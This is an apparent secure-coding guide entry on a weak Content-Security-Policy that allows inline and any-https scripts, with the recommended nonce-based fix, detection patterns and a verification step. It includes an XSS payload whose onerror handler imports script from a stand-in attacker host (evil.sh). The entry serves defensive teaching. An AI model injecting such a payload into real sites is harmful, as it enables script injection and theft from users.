---
order: 11
cwe: 693
owasp: A06
title: A CSP that stops nothing
category: injection
severity: high
sink: |-
    Content-Security-Policy: script-src 'self' 'unsafe-inline' https:
payload: |-
    <img src=x onerror="import('https://evil.sh/x.js')">
fix: |
    Content-Security-Policy: script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'
detect:
    - "unsafe-inline"
    - "unsafe-eval"
    - "script-src[^;]*https?:"
verify: "Run the policy through CSP Evaluator, or inject `<img src=x onerror=alert(1)>` and look for a violation in the console."
fineWhen: "`'unsafe-inline'` sits beside a nonce or hash: modern browsers then ignore it, and it only keeps old ones working."
refs:
    - https://web.dev/articles/strict-csp
    - https://csp-evaluator.withgoogle.com/
---

When I find an XSS, your policy decides whether I win. `'unsafe-inline'` lets my `onerror` run, and a bare `https:` lets me load from anywhere. A nonce and `strict-dynamic` let your scripts run and nothing else.
